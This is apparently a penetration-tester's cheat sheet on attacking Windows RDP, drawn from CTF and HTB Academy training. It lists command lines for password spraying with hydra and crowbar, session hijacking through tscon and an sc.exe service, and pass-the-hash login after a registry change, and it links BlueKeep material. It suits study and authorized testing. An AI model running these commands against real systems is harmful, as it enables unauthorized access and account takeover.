# RDP

> *Source CTF and HTB Academy*

- Usually on port 3389

The Remote Desktop Protocol (RDP) is a protocol developed by Microsoft for remote access to a computer running the Windows operating system. This protocol allows display and control commands to be transmitted via the GUI encrypted over IP networks.  

- [Official Documentation](https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol)

Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. Although it is not common, we could find an RDP service without a password if there is a misconfiguration.

> One caveat on password guessing against Windows instances is that you should consider the client's password policy.  
In many cases, a user account will be locked or disabled after a certain number of failed login attempts.  
In this case, we can perform a specific password guessing technique called Password Spraying.  
This technique works by attempting a single password for many usernames before trying another password, being careful to avoid account lockout.

## Enumeration

### Nmap

- `nmap -sV -sC 10.129.201.248 -p3389 --script rdp*`
- `nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n`

### Password Attack

#### Password spray

- [Crowbar](https://github.com/galkan/crowbar)
- `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`
- `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`

#### hydra

- `hydra -L user.list -P password.list rdp://10.129.42.197`

### Connect to RDP

- `xfreerdp /v:<target-IP> /u:<username> /p:<password>` usage. Example `xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248`
- You can also use [Remmina](https://remmina.org/)
- Or rdesktop `rdesktop 10.0.0.251` or `rdesktop -u admin -p password123 192.168.2.143`
- Remmina is also pretty cool and will save the configs

### RDP Session hijacking

To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session.  
It works by specifying which SESSION ID we would like to connect to which session name.

```powershell
# Show logged in users
query user
# hijack a session
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as PsExec or Mimikatz.  
A simple trick is to create a Windows service that, by default, will run as Local System and will execute any binary with SYSTEM privileges.  
We can use Microsoft sc.exe binary.  
First, we specify the service name (sessionhijack) and the binpath, which is the command we want to execute. Once we run the following command, a service named sessionhijack will be created.  

```powershell
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
# Start the sessionhijack service to run the command
net start sessionhijack
```

### RDP Pass-the-hash

> Restricted Admin Mode, which is disabled by default, should be enabled on the target host.  
This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa. It can be done using the following command:  
`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

- `xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9`

## CVE

- [CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708)
- [Exploitation of Windows CVE-2019-0708 (BlueKeep): Three Ways to Write Data into Kernel with RDP PDU - Palo Alto networks](https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/)

>  Note: This is a flaw that we will likely run into during our penetration tests, but it can cause system instability, including a "blue screen of death (BSoD)," and we should be careful before using the associated exploit. If in doubt, it's best to first speak with our client so they understand the risks and then decide if they would like us to run the exploit or not.